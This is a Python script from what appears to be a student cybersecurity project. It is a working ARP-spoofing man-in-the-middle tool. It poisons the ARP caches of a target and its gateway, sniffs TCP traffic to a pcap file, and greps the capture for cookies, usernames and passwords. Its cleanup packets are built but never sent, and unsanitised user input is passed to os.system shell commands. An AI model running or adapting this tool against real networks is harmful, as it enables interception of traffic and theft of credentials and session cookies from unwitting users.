'''
Cybersecurity Mini Project (2020-2021)

Group Members:
Joel Eldoe
Sahil Kohinkar
Omkar Jagtap
Vishal Sarode
'''

from scapy.all import *
import os, sys, time
conf.verb = 0

# ANSI codes for font colors
class colors:
    GREEN = '\033[92m'  #GREEN COLOR
    YELLOW = '\033[93m' #YELLOW COLOR
    RED = '\033[91m'    #RED COLOR
    RESET = '\033[0m'   #RESET COLOR

# Function to get the MAC address using ARP requests
def get_mac(ip):
    arp_request = ARP(pdst = ip)
    broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout = 5)[0]
    return answered_list[0][1].hwsrc

# Function to carry out MITM
def attack(target_IP, gateway_IP, project_name, sniff_time):
    print(f"\n[{colors.GREEN}+{colors.RESET}] {colors.GREEN}Initiating Man-In-The-Middle Attack...{colors.RESET}\n")
    target_MAC = get_mac(target_IP)
    gateway_MAC = get_mac(gateway_IP)
    packets_sent = 0

    sniffer = AsyncSniffer(filter='tcp')
    sniffer.start()
    while(sniff_time > 0):
        print(f"Time left: {sniff_time}")
        pkt1 = ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=gateway_IP)
        pkt2 = ARP(op=2, pdst=gateway_IP, hwdst=gateway_MAC, psrc=target_IP)
        send(pkt1)
        send(pkt2)
        packets_sent += 2
        time.sleep(1)
        sniff_time = sniff_time - 1

    sniffer.stop()
    data  = sniffer.results
    #print(data)

    print(f"\n[{colors.GREEN}+{colors.RESET}] {colors.YELLOW}Terminating the attack!{colors.RESET}\n")
    pkt3 = ARP(op=2, pdst=gateway_IP, hwdst=gateway_MAC, hwsrc=target_MAC, psrc=target_IP)
    pkt4 = ARP(op=2, pdst=target_IP, hwdst=target_MAC, hwsrc=gateway_MAC, psrc=gateway_IP)

    print(f"\n{packets_sent} ARP packets sent in total.\n")

    print(f"\n[{colors.GREEN}+{colors.RESET}] {colors.GREEN}Saving the captured data in {project_name} ...{colors.RESET}\n")

    os.system('mkdir ' + project_name)
    for i in range(len(data)):
        wrpcap(project_name+'/'+project_name+'.pcap', data[i], append=True)

# Function to create an analysis file of the packets captured
def create_log(project_name, analysis_file):
    print(f"[{colors.GREEN}+{colors.RESET}] Analyzing the captured data... Please don't quit!")
    os.system('echo "----- SHORT ANALYSIS OF THE SNIFFED DATA -----" >> ' + project_name+'/'+analysis_file)
    os.system('echo "\nTOTAL URLs ENCOUNTERED:" >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' + ' | grep .com >> ' + project_name+'/'+analysis_file)
    os.system('echo "\nMAIN WEBSITES VISITED:" >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep Referer >> ' + project_name+'/'+analysis_file)
    os.system('echo "\nCOOKIES CAPTURED:" >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep Cookie >> ' + project_name+'/'+analysis_file)
    os.system('echo "\nPOSSIBLE CREDENTIALS CAPTURED:" >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep username >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep user >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep uname >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep password >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep pwd >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep passwd >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep pass >> ' + project_name+'/'+analysis_file)

print(f" ----- {colors.GREEN}ARP ATTACK{colors.RESET} -----")

target_IP = input(f"Enter the target's IP: {colors.YELLOW}")
print(colors.RESET)
gateway_IP = input(f"Enter the gateway IP: {colors.YELLOW}")
print(colors.RESET)
sniff_time = int(input(f"How long should it sniff? (in seconds): {colors.YELLOW}"))
print(colors.RESET)

if(len(target_IP.split(".")) == 4 and len(gateway_IP.split(".")) == 4):
    project_name = input(f"Enter the name of the project: {colors.YELLOW}")
    print(colors.RESET)

    if(len(project_name.split(".")) == 2):
        if(project_name.split(".")[1] != "pcap"):
            analysis_file = project_name + "_analysis.txt"
        else:
            analysis_file = project_name.split(".")[0] + "_analysis.txt"
    else:
        analysis_file = project_name + "_analysis.txt"

    # Enabling IP forwarding
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    # ARP poisoning attack
    attack(target_IP, gateway_IP, project_name, sniff_time)

    # Analysing the data captured
    create_log(project_name, analysis_file)
    time.sleep(1)
    print(f"[{colors.GREEN}+{colors.RESET}] Quitting\n")
    time.sleep(1)

else:
    print(f"\n[{colors.RED}-{colors.RESET}] {colors.RED}!!! Invalid IP address !!!{colors.RESET}")
    print(f"[{colors.GREEN}+{colors.RESET}] Quitting\n")
    time.sleep(1)

# End of program